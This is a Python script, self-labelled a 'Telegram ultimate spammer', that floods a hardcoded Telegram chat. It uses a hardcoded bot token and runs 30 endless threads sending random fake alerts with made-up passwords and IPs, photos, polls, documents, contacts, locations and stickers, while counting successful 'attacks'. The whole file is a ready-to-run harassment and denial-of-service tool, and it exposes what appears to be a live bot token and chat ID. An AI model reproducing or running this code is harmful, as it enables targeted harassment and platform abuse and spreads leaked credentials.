import requests
import random
import string
import threading
import time
from colorama import Fore, Style, init

# Initialize colorama
init()

# Config
BOT_TOKEN = "8046322982:AAGHfnyuZghdFCIJlLSaydv5TXfJLfaZylo"
CHAT_ID = "7671709991"
BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# Attack counters
success_count = 0
fail_count = 0

def generate_random_text(length=64):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def print_banner():
    banner = f"""
{Fore.RED}
███╗   ██╗██╗██╗  ██╗███████╗███████╗
████╗  ██║██║╚██╗██╔╝╚══███╔╝╚══███╔╝
██╔██╗ ██║██║ ╚███╔╝   ███╔╝   ███╔╝ 
██║╚██╗██║██║ ██╔██╗  ███╔╝   ███╔╝  
██║ ╚████║██║██╔╝ ██╗███████╗███████╗
╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
{Fore.GREEN}>>> TELEGRAM ULTIMATE SPAMMER V2 <<<
{Fore.YELLOW}>>> Target: {CHAT_ID} <<<
{Style.RESET_ALL}
"""
    print(banner)

def send_message_v1():
    global success_count, fail_count
    text = f"[NIKZZ-SPAM] ID:{generate_random_text(8)} | Pass:{generate_random_text(12)} | IP:{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    try:
        res = requests.post(f"{BASE_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": text}, timeout=3)
        if res.status_code == 200:
            success_count += 1
            print(f"{Fore.GREEN}[✓] [ATTACKER-NKZ] Success! | Total: {success_count}{Style.RESET_ALL}")
        else:
            fail_count += 1
            print(f"{Fore.RED}[✗] Failed ({res.status_code}) | Fails: {fail_count}{Style.RESET_ALL}")
    except Exception as e:
        fail_count += 1
        print(f"{Fore.RED}[!] Error: {str(e)[:30]}... | Fails: {fail_count}{Style.RESET_ALL}")

def send_message_v2():
    global success_count, fail_count
    text = f"🚨 ALERT: User_{generate_random_text(6)} logged from {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    try:
        res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": CHAT_ID, "text": text}, timeout=3)
        if res.status_code == 200:
            success_count += 1
    except:
        fail_count += 1

def send_message_v3():
    global success_count, fail_count
    text = f"*URGENT*: `{generate_random_text(10)}` detected\n```{generate_random_text(30)}```"
    try:
        res = requests.post(f"{BASE_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": text, "parse_mode": "MarkdownV2"}, timeout=4)
        if res.status_code == 200:
            success_count += 1
    except:
        fail_count += 1

def send_message_v4():
    global success_count, fail_count
    try:
        res = requests.post(f"{BASE_URL}/sendPhoto", data={"chat_id": CHAT_ID, "caption": f"Photo report {generate_random_text(6)}", "photo": f"https://picsum.photos/seed/{generate_random_text(8)}/200/300"}, timeout=5)
        if res.status_code == 200:
            success_count += 1
    except:
        fail_count += 1

def send_message_v5():
    global success_count, fail_count
    try:
        res = requests.post(f"{BASE_URL}/sendPoll", json={"chat_id": CHAT_ID, "question": "Is this annoying?", "options": ["Yes", "Absolutely", "STOP", generate_random_text(8)], "is_anonymous": False}, timeout=4)
        if res.status_code == 200:
            success_count += 1
    except:
        fail_count += 1

def send_message_v6():
    global success_count, fail_count
    try:
        res = requests.post(f"{BASE_URL}/sendDocument", data={"chat_id": CHAT_ID, "document": "https://www.africau.edu/images/default/sample.pdf", "caption": "Important Document"}, timeout=6)
        if res.status_code == 200:
            success_count += 1
    except:
        fail_count += 1

def send_message_v7():
    global success_count, fail_count
    try:
        res = requests.post(f"{BASE_URL}/sendContact", data={"chat_id": CHAT_ID, "phone_number": f"+{random.randint(1,99)}{random.randint(100000000,999999999)}", "first_name": generate_random_text(6)}, timeout=4)
        if res.status_code == 200:
            success_count += 1
    except:
        fail_count += 1

def send_message_v8():
    global success_count, fail_count
    try:
        res = requests.post(f"{BASE_URL}/sendLocation", data={"chat_id": CHAT_ID, "latitude": random.uniform(-90, 90), "longitude": random.uniform(-180, 180)}, timeout=5)
        if res.status_code == 200:
            success_count += 1
    except:
        fail_count += 1

def send_message_v9():
    global success_count, fail_count
    try:
        res = requests.post(f"{BASE_URL}/sendDice", data={"chat_id": CHAT_ID}, timeout=3)
        if res.status_code == 200:
            success_count += 1
    except:
        fail_count += 1

def send_message_v10():
    global success_count, fail_count
    try:
        res = requests.post(f"{BASE_URL}/sendSticker", data={"chat_id": CHAT_ID, "sticker": "CAACAgIAAxkBAAIBYmZFkfQAAbJm5vCwW-3xX6v3z8KJAALZAANBtVYMarf4xwiNAfQ0BA"}, timeout=4)
        if res.status_code == 200:
            success_count += 1
    except:
        fail_count += 1

def attack_loop():
    methods = [
        send_message_v1, send_message_v2, send_message_v3,
        send_message_v4, send_message_v5, send_message_v6,
        send_message_v7, send_message_v8, send_message_v9,
        send_message_v10
    ]
    while True:
        method = random.choice(methods)
        method()
        time.sleep(random.uniform(0.1, 0.5))  # Tetap brutal tapi stabil

def stats_loop():
    while True:
        time.sleep(5)
        total = success_count + fail_count
        if total > 0:
            ratio = (success_count / total) * 100
            print(f"{Fore.CYAN}[STATS] Success: {success_count} | Failed: {fail_count} | Ratio: {ratio:.1f}%{Style.RESET_ALL}")
        else:
            print(f"{Fore.CYAN}[STATS] No attacks completed yet{Style.RESET_ALL}")

if __name__ == "__main__":
    print_banner()
    
    # Start stats thread
    threading.Thread(target=stats_loop, daemon=True).start()
    
    # Start optimized attack threads (30 threads)
    THREADS = 30
    for i in range(THREADS):
        threading.Thread(target=attack_loop, daemon=True).start()
        print(f"{Fore.YELLOW}[*] Started thread {i+1}/{THREADS}{Style.RESET_ALL}")
        time.sleep(0.1)  # Stagger thread starts
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Stopping attack... Final stats:")
        print(f"Total messages sent: {success_count}")
        print(f"Total failures: {fail_count}{Style.RESET_ALL}")
